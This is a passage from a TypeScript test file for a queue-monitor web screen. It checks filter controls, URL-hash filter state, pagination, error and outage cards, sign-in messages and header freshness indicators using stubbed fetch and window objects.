    buildItem({ id: 2, session: buildSession({ id: "9b2e7c41-0d3a-4c55-8e1f-2a6b9c4d7e10", profileLabel: "personal", cwdTail: "wt/owner-queue" }) }),
  ];
  const renderBar = (filter: Record<string, string>) => {
    const picks: unknown[] = [];
    const tree = render("QueueFilterBarQ", { items, filter, onFilter: (next: unknown) => picks.push(next) });
    const [bar] = findNodes(tree, (node) => node.props.atom === "FilterBar");
    const triggers = Object.fromEntries(findNodes(tree, (node) => node.props.atom === "FilterTrigger").map((node) => [node.props.axis, node.props]));
    return { bar, triggers, picks };
  };

  const rows = [
    { name: "at defaults each trigger reads All and the reset stays hidden", filter: { profile: "", session: "" }, account: "All", session: "All", isApplied: false },
    { name: "a chosen account names that account and shows the reset", filter: { profile: "personal", session: "" }, account: "personal", session: "All", isApplied: true },
    {
      name: "a chosen session names its worktree tail and id prefix",
      filter: { profile: "", session: SESSION_ID },
      account: "All",
      session: "git/glass-atrium · 6f1c2a9e",
      isApplied: true,
    },
  ];
  for (const row of rows) {
    test(row.name, () => {
      const { bar, triggers } = renderBar(row.filter);
      assert.equal(triggers.Account?.value, row.account);
      assert.equal(triggers.Session?.value, row.session);
      assert.equal(bar?.props.isApplied, row.isApplied);
    });
  }

  test("Reset filters returns both axes to All", () => {
    const { bar, picks } = renderBar({ profile: "personal", session: SESSION_ID });
    (bar?.props.onReset as () => void)();
    assert.deepEqual(getPlain(picks), [{ profile: "", session: "" }]);
  });

  test("a chosen value no loaded item carries stays an option, so its trigger still names it", () => {
    const { triggers } = renderBar({ profile: "archived", session: "" });
    assert.equal(triggers.Account?.value, "archived");
    assert.ok((triggers.Account?.options as Array<{ key: string }>).some((option) => option.key === "archived"));
  });
});

describe("filter state in the hash", () => {
  const load = async (hash: string) => {
    const location = { hash };
    const module = (await loadScreenModule(QUEUE_SRC, {
      URLSearchParams,
      window: { UI: uiStub(), location, history: { replaceState: (_state: unknown, _title: string, url: string) => { location.hash = url; } } },
    })) as ScreenModule;
    return { module, location };
  };
  const rows = [
    { name: "both axes round-trip through the screen query", start: "#queue", filter: { profile: "work-dev", session: SESSION_ID } },
    { name: "one axis round-trips and the other stays All", start: "#queue?profile=old", filter: { profile: "", session: SESSION_ID } },
    { name: "defaults leave a bare screen hash and read back as defaults", start: "#queue?profile=personal", filter: { profile: "", session: "" } },
  ];
  for (const row of rows) {
    test(row.name, async () => {
      const { module, location } = await load(row.start);
      (module.setFilterHashQ as (filter: unknown) => void)(row.filter);
      assert.ok(location.hash.startsWith("#queue"), location.hash);
      assert.deepEqual(getPlain((module.getFilterFromHashQ as () => unknown)()), row.filter);
    });
  }
});

describe("Show more", () => {
  test("Show more is the quiet small load-more button every screen uses", () => {
    const [button] = buttonLabelled(render("ShowMoreQ", { count: 100, isBusy: false, onMore: () => undefined }), "Show more");
    assert.equal(button?.props.className, "btn ghost sm");
  });

  test("the next page after the cursor joins the loaded list in queue order", async () => {
    const urls: string[] = [];
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: uiStub() },
      fetch: async (url: string) => {
        urls.push(url);
        return { status: 200, json: async () => ({ items: [buildItem({ id: 3 })], nextCursor: null, isSocketDeliveryOn: true }) };
      },
    })) as ScreenModule;
    let list: Record<string, unknown> = { status: "ready", data: { items: [buildItem({ id: 1 }), buildItem({ id: 2 })], nextCursor: 12, isSocketDeliveryOn: true } };
    const setList = (next: unknown) => {
      list = typeof next === "function" ? (next as (prev: unknown) => Record<string, unknown>)(list) : (next as Record<string, unknown>);
    };
    await (module.getMoreQ as (deps: unknown) => Promise<void>)({ list, setList, putAuth: () => undefined });
    const data = getPlain(list.data) as { items: Array<{ id: number }>; nextCursor: number | null };
    assert.match(urls[0] ?? "", /[?&]after=12(&|$)/);
    assert.deepEqual(data.items.map((item) => item.id), [1, 2, 3]);
    assert.equal(data.nextCursor, null);
  });
});

describe("list read", () => {
  const read = async (status: number, body: unknown) => {
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: uiStub() },
      fetch: async () => ({ status, json: async () => body }),
    })) as ScreenModule;
    let list: Record<string, unknown> = { status: "idle", data: null, error: null };
    const setList = (next: unknown) => {
      list = typeof next === "function" ? (next as (prev: unknown) => Record<string, unknown>)(list) : (next as Record<string, unknown>);
    };
    await (module.getListQ as (deps: unknown) => Promise<void>)({ setList, putAuth: () => undefined });
    return list;
  };

  test("an answer carrying the item list is ready", async () => {
    assert.equal((await read(200, { items: [], nextCursor: null, isSocketDeliveryOn: true })).status, "ready");
  });

  test("a 2xx answer without an item list is a read failure, never a list to render", async () => {
    const list = await read(200, { rows: [] });
    assert.equal(list.status, "error");
    assert.equal(list.data, null);
  });

  const refusals = [
    { name: "a 503 database outage is a read failure with Retry", status: 503, body: { error: "database_unavailable" }, expected: "error" },
    { name: "a 503 naming not_provisioned hands the page to the setup card", status: 503, body: { error: "not_provisioned" }, expected: "ready" },
    { name: "a 401 hands the page to the sign-in form", status: 401, body: { error: "unauthorized" }, expected: "ready" },
  ];
  for (const row of refusals) test(row.name, async () => assert.equal((await read(row.status, row.body)).status, row.expected));
});

describe("one outage reads one way across the page", () => {
  const outages = [
    { name: "no answer at all", answer: { status: 0, data: null, error: new TypeError("Failed to fetch") } },
    { name: "a database outage", answer: { status: 503, data: { error: "database_unavailable" } } },
    { name: "an unknown server error", answer: { status: 500, data: { error: "queue_environment_failure" } } },
  ];
  const others = [
    { name: "an unknown refusal", answer: { status: 415, data: null } },
    { name: "a 2xx answer without the expected list", answer: { status: 200, data: { rows: [] } } },
  ];
  type Answer = { status: number; data: unknown; error?: Error };
  const fetchFor = (answer: Answer) => async () => {
    if (answer.status === 0) throw answer.error;
    return { status: answer.status, json: async () => answer.data };
  };
  const getCard = (answer: Answer) => {
    const failure = call<{ sentence: string; next: string; detail: string }>("getReadFailureQ", answer);
    const [card] = findNodes(render("QueueFailureQ", { failure, onRetry: () => undefined }), (node) => node.props?.atom === "AlertCard");
    return { failure, card };
  };
  const getRegionText = async (answer: Answer) => {
    const module = (await loadScreenModule(QUEUE_SRC, { window: { UI: realUi }, fetch: fetchFor(answer) })) as ScreenModule;
    let region = realUi.INITIAL_REGION_STATE as { error: unknown };
    const setResumes = (next: (prev: unknown) => typeof region) => { region = next(region); };
    await (module.getResumesQ as (deps: unknown) => Promise<void>)({ setResumes, putAuth: () => undefined });
    const element = realUiReact.createElement(realUi.RegionUnavailable, { source: "recent automatic resumes", error: region.error });
    return collectText(renderScreen(element) as RenderedNode);
  };

  for (const row of [...outages, ...others]) {
    test(`the list card gives the resume region's next step, the raw answer behind Details: ${row.name}`, async () => {
      const { failure, card } = getCard(row.answer);
      const regionText = await getRegionText(row.answer);
      assert.ok(regionText.includes(String(card?.props.body)), `card "${card?.props.body}" | region "${regionText}"`);
      assert.doesNotMatch(`${card?.props.title} ${card?.props.body}`, /HTTP|\d{3}|_/);
      assert.equal(card?.props.details, failure.detail);
    });
  }

  for (const row of outages) {
    test(`a sign-in and an owner action on the same outage give the card's next step: ${row.name}`, async () => {
      const { failure } = getCard(row.answer);
      const module = (await loadScreenModule(QUEUE_SRC, { window: { UI: uiStub() }, fetch: fetchFor(row.answer) })) as ScreenModule;
      assert.equal(await (module.putLoginQ as (passphrase: string) => Promise<string | null>)("owner passphrase"), failure.next);
      assert.equal(call("getActionErrorQ", row.answer), failure.next);
    });
  }

  // sign-in and action lines carry no Details → an unanswered request in any browser wording reads as the server not answering
  test("a sign-in and an owner action on an unanswered request in unrecognised browser wording name the server, never Details", async () => {
    const answer = { status: 0, data: null, error: new TypeError("The network connection was lost.") };
    const { next } = getCard(outages[0].answer).failure;
    const module = (await loadScreenModule(QUEUE_SRC, { window: { UI: uiStub() }, fetch: fetchFor(answer) })) as ScreenModule;
    const lines = [await (module.putLoginQ as (passphrase: string) => Promise<string | null>)("owner passphrase"), call<string>("getActionErrorQ", answer)];
    assert.deepEqual(lines, [next, next]);
    assert.doesNotMatch(lines.join(" "), /Details/);
  });

  test("a database outage names the database on the card and in the region", async () => {
    const answer = { status: 503, data: { error: "database_unavailable" } };
    assert.match(String(getCard(answer).card?.props.body), /database/);
    assert.match(await getRegionText(answer), /database/);
  });

  const signIns = [
    {
      name: "a sign-in on a queue with no passphrase names the setup script",
      answer: { status: 503, data: { error: "not_provisioned" } },
      expected: "The queue is not set up. Run the queue setup script once in a terminal, then reload this page.",
    },
    { name: "a refused sign-in asks for a reload", answer: { status: 415, data: null }, expected: "The monitor refused the request. Reload the page, then try again." },
  ];
  for (const row of signIns) {
    test(row.name, async () => {
      const module = (await loadScreenModule(QUEUE_SRC, { window: { UI: uiStub() }, fetch: fetchFor(row.answer) })) as ScreenModule;
      assert.equal(await (module.putLoginQ as (passphrase: string) => Promise<string | null>)("owner passphrase"), row.expected);
    });
  }
});

describe("page header freshness", () => {
  const readAt = () => new Date().toISOString();
  const list = (overrides: Record<string, unknown> = {}) => ({ status: "ready", data: { items: [] }, error: null, readAt: readAt(), ...overrides });
  const resumes = (overrides: Record<string, unknown> = {}) => ({ ...READY_RESUMES, ...overrides });
  const getHeader = (queue: Record<string, unknown>) => {
    const [header] = findNodes(render("QueueHeaderQ", { queue: { auth: "in", reload: () => undefined, ...queue } }), (node) => node.props?.atom === "PageHeader");
    const freshness = header?.props.freshness as { props: Record<string, unknown> };
    const refresh = header?.props.refresh as { props: Record<string, unknown> };
    const stamp = collectText(renderScreen(realUiReact.createElement(realUi.FreshnessStamp, freshness.props)) as RenderedNode);
    return { stamp, isBusy: refresh.props.isBusy };
  };

  const rows = [
    { name: "a failed resume re-read after a good read reads Partial", queue: { list: list(), resumes: resumes({ data: [], error: "HTTP 503 database_unavailable" }) }, stamp: /Partial/, isBusy: false },
    { name: "a failed list read beside a good resume read reads Partial", queue: { list: list({ status: "error", error: { detail: "HTTP 500" } }), resumes: resumes() }, stamp: /Partial/, isBusy: false },
    { name: "a resume read in flight keeps Refresh busy", queue: { list: list(), resumes: resumes({ busy: true }) }, stamp: /^$/, isBusy: true },
    { name: "both reads landed shows no stamp", queue: { list: list(), resumes: resumes() }, stamp: /^$/, isBusy: false },
    { name: "signed out, the refused resume read is not a failure", queue: { auth: "out", list: list(), resumes: resumes({ data: null, status: "error", error: "HTTP 401 unauthorized" }) }, stamp: /^$/, isBusy: false },
  ];
  for (const row of rows) {
    test(row.name, () => {
      const { stamp, isBusy } = getHeader(row.queue);
      assert.match(stamp.trim(), row.stamp);
      assert.equal(isBusy, row.isBusy);
    });
  }
});
